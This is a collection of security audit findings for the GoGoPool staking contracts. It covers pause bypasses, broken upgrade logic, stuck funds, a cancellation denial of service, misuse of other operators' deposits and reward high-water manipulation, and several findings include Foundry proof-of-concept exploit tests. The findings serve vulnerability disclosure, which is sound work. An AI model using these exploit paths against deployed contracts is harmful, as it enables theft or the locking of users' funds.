# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L155-L197   # Vulnerability details  ## Impact when the contract is paused , allowing startRewardsCycle would inflate the token value which might not be safe.  Rewards should not be claimed by anyone when all other operations are paused.  I saw that the `witdrawGGP` has this `WhenNotPaused` modifier.  Inflate should not consider the paused duration.  lets say, when the contract is paused for theduration of 2 months, then the dao, protocol, and node validator would enjoy the rewards. This is not good for a health protocol  ## Proof of Concept  startRewardsCycle does not have the WhenNotPaused modifier.   function startRewardsCycle() external {   if (!canStartRewardsCycle()) {    revert UnableToStartRewardsCycle();   }     emit NewRewardsCycleStarted(getRewardsCycleTotalAmt());     // Set start of new rewards cycle   setUint(keccak256("RewardsPool.RewardsCycleStartTime"), block.timestamp);   increaseRewardsCycleCount();   // Mint any new tokens from GGP inflation   // This will always 'mint' (release) new tokens if the rewards cycle length requirement is met   //   since inflation is on a 1 day interval and it needs at least one cycle since last calculation   inflate();     uint256 multisigClaimContractAllotment = getClaimingContractDistribution("ClaimMultisig");   uint256 nopClaimContractAllotment = getClaimingContractDistribution("ClaimNodeOp");   uint256 daoClaimContractAllotment = getClaimingContractDistribution("ClaimProtocolDAO");   if (daoClaimContractAllotment + nopClaimContractAllotment + multisigClaimContractAllotment > getRewardsCycleTotalAmt()) {    revert IncorrectRewardsDistribution();   }     TokenGGP ggp = TokenGGP(getContractAddress("TokenGGP"));   Vault vault = Vault(getContractAddress("Vault"));     if (daoClaimContractAllotment > 0) {    emit ProtocolDAORewardsTransfered(daoClaimContractAllotment);    vault.transferToken("ClaimProtocolDAO", ggp, daoClaimContractAllotment);   }     if (multisigClaimContractAllotment > 0) {    emit MultisigRewardsTransfered(multisigClaimContractAllotment);    distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp);   }     if (nopClaimContractAllotment > 0) {    emit ClaimNodeOpRewardsTransfered(nopClaimContractAllotment);    ClaimNodeOp nopClaim = ClaimNodeOp(getContractAddress("ClaimNodeOp"));    nopClaim.setRewardsCycleTotal(nopClaimContractAllotment);    vault.transferToken("ClaimNodeOp", ggp, nopClaimContractAllotment);   }  }  ## Tools Used  Manual review  ## Recommended Mitigation Steps  We suggest to use `WhenNotPaused` modifier.
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol#L209-L216   # Vulnerability details   ## Impact  [Link to original code](https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol#L209-L216) ```solidity File: https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol  205 /// @notice Upgrade a contract by unregistering the existing address, and registring a new address and name  /// @param newAddr Address of the new contract  /// @param newName Name of the new contract  /// @param existingAddr Address of the existing contract to be deleted 209 function upgradeExistingContract(    address newAddr,    string memory newName,    address existingAddr   ) external onlyGuardian {    registerContract(newAddr, newName);    unregisterContract(existingAddr); 216 } ```  Function `ProtocolDAO.upgradeExistingContract` handles contract upgrading. However, there are multiple implicaitons of the coding logic in the function, which render the contract upgrading impractical.  **Implication 1**: The above function `upgradeExistingContract` registers the upgraded contract first, then unregisters the existing contract. This leads to the requirement that the upgraded contract name **must be different from** the existing contract name. Otherwise the updated contract address returned by `Storage.getAddress(keccak256(abi.encodePacked("contract.address", contractName)))` will be `address(0)` (please refer to the below POC Testcase 1). This is because if the upgraded contract uses the original name (i.e. the contract name is not changed), function call  `unregisterContract(existingAddr)` in the `upgradeExistingContract` will override the registered contract address in `Storage` to address(0) due to the use of the same contract name.  Since using the same name after upgrading will run into trouble with current coding logic, a safeguard should be in place to make sure two names are really different. For example, put this statement in the `upgradeExistingContract` function:  `require(newName != existingName, "Name not changed");`, where `existingName` can be obtained using:  `string memory existingName = store.getString(keccak256(abi.encodePacked("contract.name", existingAddr)));`.  **Implication 2**: If we really want a different name for an upgraded contract, we then get into more serious troubles: We have to upgrade other contracts that reference the upgraded contract since contract names are referenced mostly hardcoded (for security considerations). This may lead to a very complicated issue because contracts are cross-referenced. For example, contract `ClaimNodeOp` references contracts `RewardsPool`, `ProtocolDAO` and `Staking`. At the same time, contract `ClaimNodeOp` is referenced by contracts `RewardsPool` and `Staking`. This means that: 1. If contract `ClaimNodeOp` was upgraded, which means the contract name `ClaimNodeOp` was changed; 2. This requires contracts `RewardsPool` and `Staking` to be upgraded (with new names) in order to correctly reference to newly named `ClaimNodeOp` contract; 3. This further requires those contracts that reference `RewardsPool` or `Staking` to be upgraded in order to correctly reference them; 4. and this further requires those contracts that reference the above upgraded contracts to be upgraded ... 5. This may lead to complicated code management issue and expose new vulnerabilites due to possible incomplete code adaptation. 6. This may render the contracts upgrading impractical.  I rate this issue as high severity due to the fact that: Contract upgradability is one of the main features of the whole system design (all other contracts are designed upgradable except for `TokenGGP`, `Storage` and `Vault` ). However, the current `upgradeExistingContract` function's coding logic requires the upgraded contract must change its name (refer to the below Testcase 1). This inturn requires to upgrade all relevant cross-referenced contracts (refer to the below Testcase 2). Thus leading to a quite serous code management issue while upgrading contracts, and renders upgrading contracts impractical.   ## Proof of Concept  **Testcase 1**: This testcase demonstrates that current coding logic of upgrading contracts requires: **the upgraded contract must change its name**. Otherwise contract upgrading will run into issue. Put the below test case in file `ProtocolDAO.t.sol`. The test case demonstrates that `ProtocolDAO.upgradeExistingContract` does not function properly if the upgraded contract does not change the name. That is: the upgraded contract address returned by `Storage.getAddress(keccak256(abi.encodePacked("contract.address", contractName)))` will be `address(0)` if its name unchanged. ```solidity  function testUpgradeExistingContractWithNameUnchanged() public {   address addr = randAddress();   string memory name = "existingName";    address existingAddr = randAddress();   string memory existingName = "existingName";    vm.prank(guardian);   dao.registerContract(existingAddr, existingName);   assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), true);   assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), existingAddr);   assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), existingName);    vm.prank(guardian);   //@audit upgrade contract while name unchanged   dao.upgradeExistingContract(addr, name, existingAddr);   assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", addr))), true);   //@audit the registered address was deleted by function call `PtotocolDAO.unregisterContract(existingAddr)`   assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", name))), address(0));   assertEq(store.getString(keccak256(abi.encodePacked("contract.name", addr))), name);                 //@audit verify that the old contract has been de-registered   assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), false);   assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), address(0));   assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), "");  } ```  **Testcase 2**: This testcase demonstrates that current coding logic of upgrading contracts requires: **in order to upgrade a single contract, all cross-referenced contracts have to be upgraded and change their names**. Otherwise, other contracts will run into issues. If the upgraded contract does change its name, contract upgrading will succeed. However, other contracts' functions that reference the upgraded contract will fail due to referencing hardcoded contract name.  The below testcase upgrades contract `ClaimNodeOp` to `ClaimNodeOpV2`. Then, contract `Staking` calls `increaseGGPRewards` which references hardcoded contract name `ClaimNodeOp` in its modifier. The call is failed.  Test steps: 1. Copy contract file `ClaimNodeOp.sol` to `ClaimNodeOpV2.sol`, and rename the contract name from `ClaimNodeOp` to `ClaimNodeOpV2` in file  `ClaimNodeOpV2.sol`; 2. Put the below test file `UpgradeContractIssue.t.sol` under folder `test/unit/`; 3. Run the test. **Note**: In order to test actual function call after upgrading contract, this testcase upgrades a real contract `ClaimNodeOp`. This is different from the above Testcase 1 which uses a random address to simulate a contract. ```solidity // File: UpgradeContractIssue.t.sol // SPDX-License-Identifier: GPL-3.0-only pragma solidity 0.8.17;  import "./utils/BaseTest.sol"; import {ClaimNodeOpV2} from "../../contracts/contract/ClaimNodeOpV2.sol"; import {BaseAbstract} from "../../contracts/contract/BaseAbstract.sol";  contract UpgradeContractIssueTest is BaseTest {  using FixedPointMathLib for uint256;   address private nodeOp1;   uint256 internal constant TOTAL_INITIAL_GGP_SUPPLY = 22_500_000 ether;   function setUp() public override {   super.setUp();    nodeOp1 = getActorWithTokens("nodeOp1", MAX_AMT, MAX_AMT);   vm.prank(nodeOp1);   ggp.approve(address(staking), MAX_AMT);   fundGGPRewardsPool();  }   function fundGGPRewardsPool() public {   // guardian is minted 100% of the supply   vm.startPrank(guardian);   uint256 rewardsPoolAmt = TOTAL_INITIAL_GGP_SUPPLY.mulWadDown(.20 ether);   ggp.approve(address(vault), rewardsPoolAmt);   vault.depositToken("RewardsPool", ggp, rewardsPoolAmt);   vm.stopPrank();  }   function testUpgradeExistingContractWithNameChanged() public {      vm.prank(nodeOp1);   staking.stakeGGP(10 ether);                  //@audit increase GGPRewards before upgrading contract - succeed   vm.prank(address(nopClaim));   staking.increaseGGPRewards(address(nodeOp1), 10 ether);   assert(staking.getGGPRewards(address(nodeOp1)) == 10 ether);    //@audit Start to upgrade contract ClaimNodeOp to ClaimNodeOpV2      vm.startPrank(guardian);   //@audit upgrad contract   ClaimNodeOpV2 nopClaimV2 = new ClaimNodeOpV2(store, ggp);   address addr = address(nopClaimV2);   //@audit contract name must be changed due to the limitation of `upgradeExistingContract` coding logic   string memory name = "ClaimNodeOpV2";    //@audit get existing contract ClaimNodeOp info   address existingAddr = address(nopClaim);   string memory existingName = "ClaimNodeOp";      //@audit the existing contract should be already registered. Verify its info.   assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), true);   assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), existingAddr);   assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), existingName);                  //@audit Upgrade contract   dao.upgradeExistingContract(addr, name, existingAddr);      //@audit verify that the upgraded contract has correct contract info registered   assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", addr))), true);   assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", name))), addr);   assertEq(store.getString(keccak256(abi.encodePacked("contract.name", addr))), name);    //@audit verify that the old contract has been de-registered   assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), false);   assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), address(0));   assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), "");   vm.stopPrank();    vm.prank(nodeOp1);   staking.stakeGGP(10 ether);                  //@audit increase GGPRewards after upgrading contract ClaimNodeOp to ClaimNodeOpV2   vm.prank(address(nopClaimV2)); //@audit using the upgraded contract   vm.expectRevert(BaseAbstract.InvalidOrOutdatedContract.selector);   //@audit revert due to contract Staking using hardcoded contract name "ClaimNodeOp" in the modifier   staking.increaseGGPRewards(address(nodeOp1), 10 ether);  } }  ```  ## Tools Used Manual code review  ## Recommended Mitigation Steps  1. Upgrading contract does not have to change contranct names especially in such a complicated system wherein contracts are cross-referenced in a hardcoded way. I would suggest not to change contract names when upgrading contracts. 2. In function `upgradeExistingContract` definition, swap fucnction call sequence between `registerContract()` and `unregisterContract()` so that contract names can keep unchanged after upgrading. That is, the modified function would be: ```solidity File: https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol  205 /// @notice Upgrade a contract by unregistering the existing address, and registring a new address and name  /// @param newAddr Address of the new contract  /// @param newName Name of the new contract  /// @param existingAddr Address of the existing contract to be deleted 209 function upgradeExistingContract(    address newAddr,    string memory newName,  //@audit this `newName` parameter can be removed if upgrading don't change contract name    address existingAddr   ) external onlyGuardian {     unregisterContract(existingAddr);  //@audit unregister the existing contract first   registerContract(newAddr, newName);  //@audit then register the upgraded contract 216 } ```  **POC of Mitigation**:  After the above recommended mitigation, the below Testcase vefifies that after upgrading contracts, other contract's functions, which reference the hardcoded contract name, can still opetate correctly.  1. Make the above recommended mitigation in function `ProtocolDAO.upgradeExistingContract`; 2. Put the below test file `UpgradeContractImproved.t.sol` under folder `test/unit/`; 3. Run the test. **Note**: Since we don't change the upgraded contract name, for testing purpose, we just need to create a new contract instance (so that the contract instance address is changed) to simulate the contract upgrading. ```solidity  // File: UpgradeContractImproved.t.sol  // SPDX-License-Identifier: GPL-3.0-only  pragma solidity 0.8.17;   import "./utils/BaseTest.sol";  import {ClaimNodeOp} from "../../contracts/contract/ClaimNodeOp.sol";  import {BaseAbstract} from "../../contracts/contract/BaseAbstract.sol";   contract UpgradeContractImprovedTest is BaseTest {   using FixedPointMathLib for uint256;    address private nodeOp1;    uint256 internal constant TOTAL_INITIAL_GGP_SUPPLY = 22_500_000 ether;    function setUp() public override {    super.setUp();     nodeOp1 = getActorWithTokens("nodeOp1", MAX_AMT, MAX_AMT);    vm.prank(nodeOp1);    ggp.approve(address(staking), MAX_AMT);    fundGGPRewardsPool();   }    function fundGGPRewardsPool() public {    // guardian is minted 100% of the supply    vm.startPrank(guardian);    uint256 rewardsPoolAmt = TOTAL_INITIAL_GGP_SUPPLY.mulWadDown(.20 ether);    ggp.approve(address(vault), rewardsPoolAmt);    vault.depositToken("RewardsPool", ggp, rewardsPoolAmt);    vm.stopPrank();   }    function testUpgradeContractCorrectlyWithNameUnChanged() public {    //@audit increase GGPRewards before upgrading contract - no problem    vm.prank(nodeOp1);    staking.stakeGGP(10 ether);     vm.prank(address(nopClaim));    staking.increaseGGPRewards(address(nodeOp1), 10 ether);    assert(staking.getGGPRewards(address(nodeOp1)) == 10 ether);     //@audit Start to upgrade contract ClaimNodeOp    vm.startPrank(guardian);    //@audit upgraded contract by creating a new contract instance    ClaimNodeOp nopClaimV2 = new ClaimNodeOp(store, ggp);    address addr = address(nopClaimV2);    //@audit contract name is not changed!    string memory name = "ClaimNodeOp";     //@audit get existing contract info    address existingAddr = address(nopClaim);    string memory existingName = "ClaimNodeOp";     //@audit new contract address is different from the old one    assertFalse(addr == existingAddr);        //@audit the existing contract should be already registered. Verify its info.    assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), true);    assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), existingAddr);    assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), existingName);                          //@audit Upgrade contract    dao.upgradeExistingContract(addr, name, existingAddr);        //@audit verify the upgraded contract has correct contract info registered    assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", addr))), true);    assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", name))), addr);    assertEq(store.getString(keccak256(abi.encodePacked("contract.name", addr))), name);     //@audit verify that the old contract has been de-registered    assertEq(store.getBool(keccak256(abi.encodePacked("contract.exists", existingAddr))), false);    assertEq(store.getString(keccak256(abi.encodePacked("contract.name", existingAddr))), "");    //@audit The contract has new address now. Note that: existingName == name    assertEq(store.getAddress(keccak256(abi.encodePacked("contract.address", existingName))), addr);    vm.stopPrank();     //@audit increase GGPRewards after upgrading contract ClaimNodeOp to ClaimNodeOpV2    vm.prank(nodeOp1);    staking.stakeGGP(10 ether);     vm.prank(address(nopClaimV2)); //@audit using the new contract    //@audit Successfully call the below function with hardcoded contract name "ClaimNodeOp" in the modifier    staking.increaseGGPRewards(address(nodeOp1), 10 ether);    //@audit Successfully increased!    assert(staking.getGGPRewards(address(nodeOp1)) == 20 ether);   }  }  ``` 
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L287   # Vulnerability details  ## Impact  The Multisig can call ```MinipoolManager.sol::recordStakingError()``` if there is an error while registering the node as a validator. Also the Multisig can call [MinipoolManager.sol::finishFailedMinipoolByMultisig()](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L528) in order to "finish" the NodeOp's minipool proccess.  If the Multisig accidentally/intentionally calls ```recordStakingError()``` then ```finishFailedMinipoolByMultisig()``` the NodeOp funds may be trapped in the protocol.  The ```finishFailedMinipoolByMultisig()``` has the next comment: *Multisig can move a minipool from the error state to the finished state after a human review of the error* but the NodeOp should be able to withdraw his funds after a finished minipool.  ## Proof of Concept  I created a test for this situation in ```MinipoolManager.t.sol```. At the end you can observe that the ```withdrawMinipoolFunds()``` reverts with ```InvalidStateTransition``` error:  1. NodeOp creates the minipool 2. Rialto calls claimAndInitiateStaking 3. Something goes wrong and Rialto calls recordStakingError() 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order to finish the NodeOp's minipool 5. The NodeOp can not withdraw his funds. The withdraw function reverts with InvalidStateTransition() error  ```solidity function testUserFundsStuckErrorFinished() public {     // NodeOp funds may be trapped by a invalid state transition     // 1. NodeOp creates the minipool     // 2. Rialto calls claimAndInitiateStaking     // 3. Something goes wrong and Rialto calls recordStakingError()     // 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order      // to finish the NodeOp's minipool     // 5. The NodeOp can not withdraw his funds. The withdraw function reverts with     // InvalidStateTransition() error     //     // 1. Create the minipool by the NodeOp     //     address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);     vm.prank(liqStaker1);     ggAVAX.depositAVAX{value: MAX_AMT}();     assertEq(liqStaker1.balance, 0);     uint256 duration = 2 weeks;     uint256 depositAmt = 1000 ether;     uint256 avaxAssignmentRequest = 1000 ether;     uint256 validationAmt = depositAmt + avaxAssignmentRequest;     uint128 ggpStakeAmt = 200 ether;     vm.startPrank(nodeOp);     ggp.approve(address(staking), ggpStakeAmt);     staking.stakeGGP(ggpStakeAmt);     MinipoolManager.Minipool memory mp = createMinipool(depositAmt, avaxAssignmentRequest, duration);     vm.stopPrank();     assertEq(vault.balanceOf("MinipoolManager"), depositAmt);     //     // 2. Rialto calls claimAndInitiateStaking     //     vm.startPrank(address(rialto));     minipoolMgr.claimAndInitiateStaking(mp.nodeID);     assertEq(vault.balanceOf("MinipoolManager"), 0);     //     // 3. Something goes wrong and Rialto calls recordStakingError()     //     bytes32 errorCode = "INVALID_NODEID";     minipoolMgr.recordStakingError{value: validationAmt}(mp.nodeID, errorCode);     // NodeOps funds should be back in vault     assertEq(vault.balanceOf("MinipoolManager"), depositAmt);     // 4. Rialto accidentally/intentionally calls finishFailedMinipoolByMultisig() in order      // to finish the NodeOp's minipool     minipoolMgr.finishFailedMinipoolByMultisig(mp.nodeID);     vm.stopPrank();     // 5. The NodeOp can not withdraw his funds. The withdraw function reverts with     // InvalidStateTransition() error     vm.startPrank(nodeOp);     vm.expectRevert(MinipoolManager.InvalidStateTransition.selector);     minipoolMgr.withdrawMinipoolFunds(mp.nodeID);     vm.stopPrank(); } ```  ## Tools used  Foundry/Vscode  ## Recommended Mitigation Steps  The ```withdrawMinipoolFunds``` could add another [requireValidStateTransition](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#LL290C3-L290C30) in order to allow the withdraw after the finished minipoool.
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L328-L332 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89-L114 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimProtocolDAO.sol#L20-L35   # Vulnerability details  ## Impact  The `whenNotPaused` modifier is used to pause minipool creation and staking/withdrawing GGP. However, there are several cases this modifier could be bypassed, which breaks the intended admin control function and special mode.   ## Proof of Concept  ### `stake()`  In paused mode, no more `stakeGGP()` is allowed,  ```solidity File: contract/Staking.sol 319:  function stakeGGP(uint256 amount) external whenNotPaused { 320:   // Transfer GGP tokens from staker to this contract 321:   ggp.safeTransferFrom(msg.sender, address(this), amount); 322:   _stakeGGP(msg.sender, amount); 323:  } ```  However, `restakeGGP()` is still available, which potentially violate the purpose of pause mode. ```solidity File: contract/Staking.sol 328:  function restakeGGP(address stakerAddr, uint256 amount) public onlySpecificRegisteredContract("ClaimNodeOp", msg.sender) { 329:   // Transfer GGP tokens from the ClaimNodeOp contract to this contract 330:   ggp.safeTransferFrom(msg.sender, address(this), amount); 331:   _stakeGGP(stakerAddr, amount); 332:  } ```  ### `withdraw()`  In paused mode, no more `withdrawGGP()` is allowed,  ```solidity File: contract/Staking.sol 358:  function withdrawGGP(uint256 amount) external whenNotPaused {  373:   vault.withdrawToken(msg.sender, ggp, amount); ```  However, `claimAndRestake()` is still available, which can withdraw from the vault. ```solidity File: contract/ClaimNodeOp.sol 089:  function claimAndRestake(uint256 claimAmt) external {  103:   if (restakeAmt > 0) { 104:    vault.withdrawToken(address(this), ggp, restakeAmt); 105:    ggp.approve(address(staking), restakeAmt); 106:    staking.restakeGGP(msg.sender, restakeAmt); 107:   } 108:  109:   if (claimAmt > 0) { 110:    vault.withdrawToken(msg.sender, ggp, claimAmt); 111:   } ```  THe function `spend()` can also ignore the pause mode to withdraw from the vault. But this is a guardian function. It could be intended behavior. ```solidity File: contract/ClaimProtocolDAO.sol 20:  function spend( 21:   string memory invoiceID, 22:   address recipientAddress, 23:   uint256 amount 24:  ) external onlyGuardian {  32:   vault.withdrawToken(recipientAddress, ggpToken, amount); ```    ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  - add the `whenNotPaused` modifier to `restakeGGP()` and `claimAndRestake()` - maybe also for guardian function `spend()`.
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L664   # Vulnerability details  ## Impact A malicious node operator may create a minipool that cannot be cancelled.  ## Proof of Concept Rialto may cancel a minipool by calling [cancelMinipoolByMultisig](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L520), however the function sends AVAX to the minipool owner, and the owner may block receiving of AVAX, causing the call to `cancelMinipoolByMultisig` to fail ([MinipoolManager.sol#L664](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L664)): ```solidity function _cancelMinipoolAndReturnFunds(address nodeID, int256 index) private {   ...   address owner = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".owner")));   ...   owner.safeTransferETH(avaxNodeOpAmt); } ```  The following PoC demonstrates how calls to `cancelMinipoolByMultisig` can be blocked: ```solidity function testCancelMinipoolByMultisigDOS_AUDIT() public {   uint256 duration = 2 weeks;   uint256 depositAmt = 1000 ether;   uint256 avaxAssignmentRequest = 1000 ether;   uint128 ggpStakeAmt = 200 ether;    // Node operator is a contract than cannot receive AVAX:   // contract NodeOpContract {}   NodeOpContract nodeOpContract = new NodeOpContract();   dealGGP(address(nodeOpContract), ggpStakeAmt);   vm.deal(address(nodeOpContract), depositAmt);    vm.startPrank(address(nodeOpContract));   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(ggpStakeAmt);   MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);   vm.stopPrank();    bytes32 errorCode = "INVALID_NODEID";   int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);   store.setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Prelaunch));    // Rialto trices to cancel the minipool created by the node operator contract but the transaction reverts since   // the node operator contract cannot receive AVAX.   vm.prank(address(rialto));   // FAIL: reverted with ETH_TRANSFER_FAILED   minipoolMgr.cancelMinipoolByMultisig(mp1.nodeID, errorCode); } ```  ## Tools Used Manual review ## Recommended Mitigation Steps Consider using the [Pull over Push pattern](https://fravoll.github.io/solidity-patterns/pull_over_push.html) to return AVAX to owners of minipools that are canceled by Rialto.
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L444   # Vulnerability details  ## Impact  Minipools can be created using other operator's AVAX deposit via recreateMinipool  ## Proof of Concept  This issue is related to state transition of Minipools. According to the implementation, the possible states and transitions are as below.  ![Imgur](https://imgur.com/ASL235O.jpg)  The Rialto may call `recreateMinipool` when the minipool is in states of `Withdrawable, Finished, Error, Canceled`. The problem is that these four states are not the same in the sense of holding the node operator's AVAX. If the state flow has followed `Prelaunch->Launched->Staking->Error`, all the AVAX are still in the vault. If the state flow has followed `Prelaunch->Launched->Staking->Error->Finished` (last transition by `withdrawMinipoolFunds`), all the AVAX are sent back to the node operator. So if the Rialto calls `recreateMinipool` for the second case, there are no AVAX deposited from the node operator at that point but there can be AVAX from other mini pools in the state of Prelaunch. Because there are AVAX in the vault (and these are not managed per staker base), `recreatePool` results in a new mini pool in `Prelaunch` state and it is further possible to go through the normal flow `Prelaunch->Launched->Staking->Withdrawable->Finished`. And the other minipool that was waiting for launch will not be able to launch because the vault is lack of AVAX.  Below is a test case written to show an example.  ```solidity function testAudit() public {   uint256 duration = 2 weeks;   uint256 depositAmt = 1000 ether;   uint256 avaxAssignmentRequest = 1000 ether;   uint256 validationAmt = depositAmt + avaxAssignmentRequest;   uint128 ggpStakeAmt = 200 ether;    // Node Op 1   vm.startPrank(nodeOp);   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(ggpStakeAmt);   MinipoolManager.Minipool memory mp1 = createMinipool(     depositAmt,     avaxAssignmentRequest,     duration   );   vm.stopPrank();    // Node Op 2   address nodeOp2 = getActorWithTokens("nodeOp2", MAX_AMT, MAX_AMT);   vm.startPrank(nodeOp2);   ggp.approve(address(staking), MAX_AMT);   staking.stakeGGP(ggpStakeAmt);   MinipoolManager.Minipool memory mp2 = createMinipool(     depositAmt,     avaxAssignmentRequest,     duration   );   vm.stopPrank();    int256 minipoolIndex = minipoolMgr.getIndexOf(mp1.nodeID);    address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);   vm.prank(liqStaker1);   ggAVAX.depositAVAX{ value: MAX_AMT }();    // Node Op 1: Prelaunch->Launched   vm.prank(address(rialto));   minipoolMgr.claimAndInitiateStaking(mp1.nodeID);    bytes32 txID = keccak256("txid");   vm.prank(address(rialto));   // Node Op 1: Launched->Staking   minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);    vm.prank(address(rialto));   // Node Op 1: Staking->Error   bytes32 errorCode = "INVALID_NODEID";   minipoolMgr.recordStakingError{ value: validationAmt }(mp1.nodeID, errorCode);    // There are 2*depositAmt AVAX in the pool manager   assertEq(vault.balanceOf("MinipoolManager"), depositAmt * 2);    // Node Op 1: Staking->Finished withdrawing funds   vm.prank(nodeOp);   minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);   assertEq(staking.getAVAXStake(nodeOp), 0);   mp1 = minipoolMgr.getMinipool(minipoolIndex);   assertEq(mp1.status, uint256(MinipoolStatus.Finished));    // Rialto recreate a minipool for the mp1   vm.prank(address(rialto));   // Node Op 1: Finished -> Prelaunch   minipoolMgr.recreateMinipool(mp1.nodeID);    assertEq(vault.balanceOf("MinipoolManager"), depositAmt);    // Node Op 1: Prelaunch -> Launched   vm.prank(address(rialto));   minipoolMgr.claimAndInitiateStaking(mp1.nodeID);    // Node Op 1: Launched -> Staking   vm.prank(address(rialto));   minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);    assertEq(staking.getAVAXStake(nodeOp), 0);   assertEq(staking.getAVAXAssigned(nodeOp), depositAmt);   assertEq(staking.getAVAXAssignedHighWater(nodeOp), depositAmt);    // now try to launch the second operator's pool, it will fail with InsufficientContractBalance   vm.prank(address(rialto));   vm.expectRevert(Vault.InsufficientContractBalance.selector);   minipoolMgr.claimAndInitiateStaking(mp2.nodeID); }  ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  Make sure to keep the node operator's deposit status the same for all states that can lead to the same state. For example, for all states that can transition to Prelaunch, make sure to send the AVAX back to the user and get them back on the call `recreateMiniPool()`.
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L374   # Vulnerability details  ## Impact  Node operators can manipulate the assigned high water to be higher than the actual.  ## Proof of Concept  The protocol rewards node operators according to the `AVAXAssignedHighWater` that is the maximum amount assigned to the specific staker during the reward cycle. In the function `MinipoolManager.recordStakingStart()`, the `AVAXAssignedHighWater` is updated as below.  ```solidity MinipoolManager.sol 349:  function recordStakingStart( 350:   address nodeID, 351:   bytes32 txID, 352:   uint256 startTime 353:  ) external { 354:   int256 minipoolIndex = onlyValidMultisig(nodeID); 355:   requireValidStateTransition(minipoolIndex, MinipoolStatus.Staking); 356:   if (startTime > block.timestamp) { 357:    revert InvalidStartTime(); 358:   } 359: 360:   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".status")), uint256(MinipoolStatus.Staking)); 361:   setBytes32(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".txID")), txID); 362:   setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".startTime")), startTime); 363: 364:   // If this is the first of many cycles, set the initialStartTime 365:   uint256 initialStartTime = getUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime"))); 366:   if (initialStartTime == 0) { 367:    setUint(keccak256(abi.encodePacked("minipool.item", minipoolIndex, ".initialStartTime")), startTime); 368:   } 369: 370:   address owner = 